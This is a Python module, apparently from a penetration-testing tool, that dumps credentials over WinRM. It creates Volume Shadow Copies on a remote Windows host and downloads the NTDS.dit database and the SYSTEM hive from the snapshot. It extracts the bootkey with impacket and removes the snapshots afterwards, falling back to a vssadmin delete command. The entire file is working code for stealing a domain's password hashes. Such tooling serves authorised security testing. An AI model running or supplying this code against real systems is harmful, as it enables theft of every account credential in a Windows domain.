import time
from binascii import hexlify

from impacket.examples.secretsdump import LocalOperations
from pypsrp.exceptions import WSManFaultError
from pypsrp.wsman import SelectorSet

WMI_BASE = "http://schemas.microsoft.com/wbem/wsman/1/wmi"


class RemoteOperations:
    def __init__(self, connection, shadow_id=None):
        self.connection = connection
        self.wsman = connection.conn.wsman
        self.logger = connection.logger

        # Cached variables
        self.bootkey = None
        if shadow_id is not None:
            self.logger.display(f"Using existing VSS Snapshot ID: {shadow_id}")
        self._shadow_id = shadow_id
        # Snapshot devices by volume, created on demand: the NTDS database
        # can live on a drive other than the system one
        self._shadow_devices = {}

        # Keep track of the shadow copies we created, to delete them in finish()
        self._created_shadow_ids = []

    def delete_shadowcopy(self, shadow_id):
        selector = SelectorSet()
        selector.add_option("ID", shadow_id)
        self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
        try:
            self.wsman.delete(f"{WMI_BASE}/root/cimv2/Win32_ShadowCopy", selector_set=selector)
        except WSManFaultError as e:
            # WinRM 2.0 (2008 R2 / Windows 7) does not support WS-Delete on
            # the WMI plugin: fall back to vssadmin through the shell
            if e.code != 2150858801:
                raise
            self.logger.debug(f"WMI plugin has no Delete operation, falling back to vssadmin for {shadow_id} (process creation)")
            self.connection.execute(f"vssadmin delete shadows /shadow={shadow_id} /quiet", True)
        self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
        self._created_shadow_ids.remove(shadow_id)

    def finish(self):
        """Delete the shadow copies we created, while the connection is still alive.

        Called explicitly at the end of the operations using this class:
        the destructor only runs after the protocol already disconnected,
        when it can no longer reach the service.
        """
        for shadow_id in list(self._created_shadow_ids):
            try:
                self.delete_shadowcopy(shadow_id)
            except Exception as e:
                self.logger.fail(f"Could not delete ShadowCopy ID {shadow_id}. You will need to delete this by yourself. ({e})")

    def __del__(self):
        self.finish()

    def create_shadowcopy(self, volume="C:\\"):
        shadow_id = None
        try:
            self.logger.debug(f"Trying to create a VSS snapshot of {volume} remotely via WSMan")
            result = self.connection.wmi_invoke(
                "root\\cimv2",
                "Win32_ShadowCopy",
                "Create",
                {"Context": "ClientAccessible", "Volume": volume},
            )
            if str(result.get("ReturnValue")) == "0":
                shadow_id = result.get("ShadowID")
                self._created_shadow_ids.append(shadow_id)
                self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
            else:
                self.logger.debug(f"Win32_ShadowCopy.Create returned {result.get('ReturnValue')}")
        except Exception as e:
            self.logger.debug(f"Cannot create ShadowCopy: {e}")
        return shadow_id

    def get_shadowcopy_path(self, shadow_id=None):
        if shadow_id is None:
            shadow_id = self.shadow_id
        device_object = None
        query = f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"'
        for _ in range(3):
            records = self.connection.wql_enumerate(query, "root\\cimv2")
            if records:
                device_object = records[0].get("DeviceObject")
                break
            # the instance is queryable shortly after Create returns
            time.sleep(2)
        if device_object:
            self.logger.debug(f"Found ShadowCopy at {device_object}")
        return device_object

    @property
    def shadow_id(self):
        if self._shadow_id is None:
            self._shadow_id = self.create_shadowcopy()
        return self._shadow_id

    def shadow_path(self, file_path):
        """Map a live file path to its location inside a snapshot of its volume."""
        volume = file_path[:3]
        if volume not in self._shadow_devices:
            shadow_id = self.shadow_id if volume.upper() == "C:\\" else self.create_shadowcopy(volume)
            if shadow_id is None:
                return None
            self._shadow_devices[volume] = self.get_shadowcopy_path(shadow_id)
        device = self._shadow_devices[volume]
        return f"{device}{file_path[2:]}" if device else None

    def get_file(self, remote_path, download_path):
        """Fetch a remote file through the protocol file transfer.

        The registry hives are locked by the OS on the live filesystem, so the
        files are fetched from the shadow copy GLOBALROOT path instead.
        """
        return self.connection.file_transfer.get_file(remote_path, download_path)

    def get_ntds_location(self):
        """Read the NTDS database path from the registry through StdRegProv."""
        result = self.connection.wmi_invoke(
            "root\\default",
            "StdRegProv",
            "GetStringValue",
            {
                "hDefKey": 2147483650,  # HKEY_LOCAL_MACHINE
                "sSubKeyName": r"SYSTEM\CurrentControlSet\Services\NTDS\Parameters",
                "sValueName": "DSA Database file",
            },
        )
        if str(result.get("ReturnValue")) == "0":
            return result.get("sValue")
        return None

    def get_ntds(self, output_filename):
        """Fetch the NTDS database from a snapshot of its volume."""
        ntds_location = self.get_ntds_location()
        if not ntds_location:
            self.logger.fail("Could not find the NTDS database path (is this a Domain Controller?)")
            return None
        self.logger.debug(f"NTDS database located at {ntds_location}")

        ntds_path = self.shadow_path(ntds_location)
        if ntds_path is None or not self.get_file(ntds_path, f"{output_filename}.dit"):
            self.logger.fail("Could not get the NTDS database")
            return None
        return f"{output_filename}.dit"

    def get_bootkey(self, output_filename):
        if self.bootkey is not None:
            return self.bootkey

        # the SYSTEM hive is the biggest transfer of the dump
        self.logger.display("Fetching the SYSTEM hive for the bootkey...")
        system_hive_path = self.shadow_path(r"C:\Windows\System32\config\SYSTEM")
        if system_hive_path is None or not self.get_file(system_hive_path, f"{output_filename}.system"):
            self.logger.fail("Could not get the SYSTEM hive")
            return None
        self.logger.debug("Got SYSTEM hive")

        local_operations = LocalOperations(f"{output_filename}.system")
        self.bootkey = local_operations.getBootKey()
        self.logger.debug(f"Got bootkey: 0x{hexlify(self.bootkey).decode('utf-8')}")
        return self.bootkey
